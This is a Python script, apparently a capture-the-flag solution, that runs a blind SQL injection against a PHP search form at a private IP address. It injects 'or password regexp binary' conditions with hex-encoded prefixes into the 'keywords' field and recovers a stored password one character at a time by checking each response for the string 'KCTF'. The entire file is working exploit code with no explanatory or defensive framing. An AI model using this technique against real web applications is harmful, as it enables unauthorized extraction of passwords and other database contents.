import binascii,requests

url='http://10.3.120.30/index.php'
key=''
headers = {
      'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
      'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Connection':'keep-alive'
    }


while 1:

    for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789':
        keyword='^'+key+i
        data={
            'keywords':'or password regexp binary 0x{}#'.format(binascii.b2a_hex(keyword.encode()).decode()),
            'submit':'%E6%9F%A5%E6%89%BE'
        }

        res=requests.post(url,data=data,headers=headers).text
        if 'KCTF' in res:
            key+=i
            print(key)
            break